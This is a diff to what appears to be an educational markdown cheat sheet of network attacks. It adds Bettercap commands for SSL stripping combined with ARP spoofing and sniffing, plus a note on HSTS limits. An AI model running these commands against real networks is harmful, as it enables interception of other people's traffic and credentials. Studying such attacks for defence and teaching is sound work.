@@ -2,7 +2,7 @@
 
 #### Types of Attacks:
 1. [ARP Cache Poisoning / Spoofing](#arp-cache-poisoning--spoofing-w-metasploit)
-1. [SMURF Attack / ICMP Flooding](#hping-commands)
+1. [SMURF Attack / ICMP Flooding / IP Spoofing](#hping-commands)
 1. [Denial of Service / DoS Attack](#hydra-command)
 1. [Christmas Tree Attack](#hping-commands)
 1. [Brute Force Attack](#hydra-command)
@@ -135,8 +135,21 @@
 
 ---
 
-#### SSL Stripping:
+#### SSL Stripping (/w Bettercap):
 > AKA SSL downgrade or HTTP downgrade attacks which is a type of cyber attack where hackers downgrade a web connection from the more secure **HTTPS** to the less secure **HTTP**. This makes all communications unencrypted and sets the stage for a man-in-the-middle attack, in which the hacker sits in the middle of a conversation listening or intercepting information.
+
+To perform SSL Stripping we'll be using **Bettercap** as follows:
+> $ `bettercap -iface eth0`
+>
+> \>\> `set http.proxy.sslstrip true`
+>
+> \>\> `set net.probe on`
+>
+> \>\> `set net.sniff on`
+>
+> \>\> `arp.spoof on`
+
+> **NOTE: SSL Stripping won't work on cached URLs, and when HSTS is enabled**
 
 ---
 
